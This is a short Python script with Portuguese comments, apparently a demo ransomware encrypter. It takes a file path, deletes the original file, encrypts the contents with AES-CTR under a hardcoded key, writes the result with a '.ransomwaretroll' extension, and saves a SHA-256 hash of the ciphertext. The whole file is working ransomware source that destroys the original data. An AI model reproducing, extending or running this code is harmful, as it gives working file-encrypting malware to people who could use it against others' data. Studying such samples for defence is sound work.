import hashlib
import os
import sys

import pyaes


def encrypt_file(file_name):
    ## abrir o arquivo a ser criptografado
    # file_name = "teste.txt"
    file = open(file_name, "rb")
    file_data = file.read()
    file.close()

    ## remover o arquivo
    os.remove(file_name)

    ## chave de criptografia
    key = b"testeransomwares"
    aes = pyaes.AESModeOfOperationCTR(key)

    ## criptografar o arquivo
    crypto_data = aes.encrypt(file_data)

    ## salvar o arquivo criptografado
    new_file = file_name + ".ransomwaretroll"
    new_file = open(f"{new_file}", "wb")
    new_file.write(crypto_data)
    new_file.close()
    # Gerar o hash do arquivo encriptado
    hash_object = hashlib.sha256(crypto_data)
    hex_dig = hash_object.hexdigest()

    # Salvar o hash em um arquivo
    new_hash_file = "hash_code.txt"
    with open(new_hash_file, "w") as hash_file:
        # abre o arquivo "hash_code.txt" no modo de escrita ("w"). O comando with é usado para garantir que o arquivo seja corretamente fechado após a escrita, mesmo que ocorra uma exceção durante o processo. O arquivo aberto é referenciado pela variável hash_file.
        hash_file.write(hex_dig)
        hash_file.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python encrypter.py <file_path>")
        sys.exit(1)

    file_name = sys.argv[1]
    encrypt_file(file_name)
